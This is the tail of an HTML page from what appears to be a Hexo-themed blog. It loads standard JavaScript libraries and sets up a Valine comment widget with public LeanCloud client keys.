  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  










  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
  
  <script type="text/javascript">
    var GUEST = ['nick','mail','link'];
    var guest = 'nick,mail,link';
    guest = guest.split(',').filter(item=>{
      return GUEST.indexOf(item)>-1;
    });
    new Valine({
        el: '#comments' ,
        verify: true,
        notify: true,
        appId: 'oXGA1XzMIhhs9x4yNbf1DOge-gzGzoHsz',
        appKey: 'JYRNnDQ1kh2RA7V2MYsSnRVR',
        placeholder: 'Just go go',
        avatar:'mm',
        guest_info:guest,
        pageSize:'10' || 10,
    });
  </script>



  





  

  

  

  
  

  

  

  

</body>
</html>
